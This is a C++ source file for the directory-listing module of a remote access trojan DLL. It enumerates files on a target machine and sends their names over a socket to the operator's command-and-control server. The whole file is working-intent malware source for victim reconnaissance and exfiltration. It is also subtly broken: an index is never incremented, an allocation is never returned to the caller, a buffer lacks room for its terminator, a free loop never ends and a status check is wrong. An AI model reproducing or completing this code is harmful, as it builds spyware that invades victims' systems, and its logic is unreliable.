// Patrick Sacchet (@pjsacchet)
// Verison 1.0.
// RAT-Dll-DirList.cpp : Defines functionality for performing a dir list on target, i.e., returning a list of files within a certain directory to our C2

#include "RAT-Dll-Connect.h"
#include "RAT-Dll-DirList.h"


/** This function will perform a simple dir list for us
params:
* dirPath - path to the directory we want to list
* dirFiles - array holding each of our file names
* numDirFiles - number of files in our array
return:
* if successful we return SUCCESS; otherwise print error code and handle appropiately
*/
INT performDirList(__in char* dirPath, __inout char** dirFiles, __inout UINT32* numDirFiles)
{
	INT status = SUCCESS;
	UINT32 numFiles = 0, currIndex = 0;
	WIN32_FIND_DATA foundData;
	CHAR outputMessage[DEFAULT_BUF_LEN];
	HANDLE hFind = INVALID_HANDLE_VALUE;

	// Modify string so its an actual directory
	strncat(dirPath, "\\*", 3);

	// First pass will be so we can properly allocate our buffer for number of files we have
		// TODO: is there really not a better way of getting the number of files in a directory...
	hFind = FindFirstFile((LPCWSTR)dirPath, &foundData);
	if (hFind == INVALID_HANDLE_VALUE)
	{
		OutputDebugStringA("RAT-Dll::performDirList - Failed FindFirstFile\n");
		goto cleanup;
	}

	do
	{
		numFiles += 1;
	} while (FindNextFile(hFind, &foundData) != 0);

	// Second pass will be to actually store the files we found
		// NOTE: if the target user somehow adds or deletes files between this first and second pass there may not be enough allocated memory
	dirFiles = (char**)malloc(sizeof(char*) * numFiles);
	if (dirFiles == NULL)
	{
		OutputDebugStringA("RAT-Dll::performDirList - Failed malloc; insufficient memory!\n");
		goto cleanup;
	}

	*numDirFiles = numFiles;

	hFind = FindFirstFile((LPCWSTR)dirPath, &foundData);
	if (hFind == INVALID_HANDLE_VALUE)
	{
		OutputDebugStringA("RAT-Dll::performDirList - Failed FindFirstFile\n");
		goto cleanup;
	}

	do
	{
		// Store the file name
			// TODO: fix these gross casts
		dirFiles[currIndex] = (char*)malloc(sizeof(char) * strlen((char*)foundData.cFileName));
		if (dirFiles[currIndex] == NULL)
		{
			OutputDebugStringA("RAT-Dll::performDirList - Failed malloc; insufficient memory!\n");
			goto cleanup;
		}
		strcpy(dirFiles[currIndex], (char*)foundData.cFileName);
	} while (FindNextFile(hFind, &foundData) != 0);


cleanup:
	return status;
}

INT sendDirFiles(__inout SOCKET clientSock, __in char** dirFiles, __in UINT32 numDirFiles)
{
	INT status = SUCCESS;
	UINT32 index = 0;
	CHAR msgBuf[DEFAULT_BUF_LEN];
	char* fileName;

	while (index < numDirFiles)
	{
		fileName = dirFiles[index];

		status = send(clientSock, fileName, strlen(fileName), 0);
		if (status != SUCCESS)
		{
			sprintf_s(msgBuf, "RAT-Dll-DirList::sendDirFiles - Failure recevied from send (status code) %d\n", WSAGetLastError());
			OutputDebugStringA(msgBuf);
			status = WSAGetLastError();
			goto cleanup;
		}

		index++;
	}

	// Send 'terminator' indicating we've reached the end of our list 
	status = send(clientSock, "\x00\x00", 2, 0);
	if (status != SUCCESS)
	{
		sprintf_s(msgBuf, "RAT-Dll-DirList::sendDirFiles - Failure recevied from send (status code) %d\n", WSAGetLastError());
		OutputDebugStringA(msgBuf);
		status = WSAGetLastError();
		goto cleanup;
	}

	// Should free memory stuff here too 
	index = 0;
	while (index < numDirFiles)
	{
		free(dirFiles[index]);
	}

	free(dirFiles);


cleanup:
	return status;
}